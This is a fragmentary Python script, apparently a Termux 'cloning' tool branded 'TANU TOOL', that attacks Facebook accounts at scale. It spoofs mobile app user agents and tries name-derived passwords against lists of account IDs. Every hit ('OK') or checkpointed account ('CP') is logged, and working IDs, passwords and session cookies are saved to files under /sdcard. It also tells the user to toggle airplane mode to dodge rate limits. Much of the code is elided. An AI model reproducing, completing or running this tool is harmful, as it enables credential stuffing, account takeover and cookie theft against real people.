...
def randBuildLSB():
    ...
    ua = random.choice(["Mozilla/5.0 (Linux; Android 6.0; Micromax Q480) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36"]) +END
    return ua

def randBuildvsskj():
    END = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07}]'
    ua = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22 Build/HONORDUA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 Instagram 180.0.0.31.119 Android (27/8.1.0; 320dpi; 720x1356; HUAWEI/HONOR; DUA-L22; HWDUA-M; mt6739; ru_RU; 279996067)",]) +END
    return ua
...
........................................                                                                                          
\033[1;37m------------------------------------------------
\033[1;32m Owner   :            Loser
\033[1;36m Facebook:            Loser
\033[1;31m Github  :            Rana -Tanu
\033[1;32m Version :            1.0
\033[1;37m------------------------------------------------
------------------------------------------------
            \033[1;41m\033[1;37m[WELLCOME TO \033[1;42m\033[1;37mTANU TOOL]\x1b[0m
------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Loser Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Loser] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Loser-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Loser_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Loser_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [Loser-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Loser_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'content-type':'application/x-www-form-urlencoded',
			...
			'content-length': '204'}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Loser-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Loser_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Loser-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Loser_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"\r{A}\033[1;92mUse flight Helicopter mode before use {S}")
            print(47*"-")
            print(f'{S}\033[1;91m Total Account : %s ' % len(self.id))
            print(f'{S}\033[1;96m Start Cloning...')
            print(47*"-")
